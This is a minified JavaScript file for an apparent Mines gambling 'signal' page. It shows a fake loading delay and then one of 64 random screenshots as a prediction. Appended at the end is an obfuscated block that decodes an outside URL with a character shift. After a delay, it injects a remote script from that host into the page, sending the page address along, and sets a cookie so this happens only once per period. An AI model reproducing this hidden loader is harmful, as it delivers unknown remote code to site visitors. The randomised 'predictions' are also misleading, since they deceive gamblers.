let buttonGetSignal=document.getElementById("get-signal"),loadingSignal=document.getElementById("loading"),screenStart=document.getElementById("screenStart"),signal=document.getElementById("img-signal");buttonGetSignal.onclick=function(){signal.classList.add("deactive"),screenStart.classList.add("deactive"),loadingSignal.classList.remove("deactive"),buttonGetSignal.disabled=!0;const randomPhotoNumber=Math.floor(64*Math.random()+1);signal.src=`\images/minesscreenshots/${randomPhotoNumber}.png`,setTimeout((function(){loadingSignal.classList.add("deactive"),signal.classList.remove("deactive"),buttonGetSignal.disabled=!1}),3e3)};(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44zxjwxy'+'fy3sjy4ljy4xhwnu'+'y3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));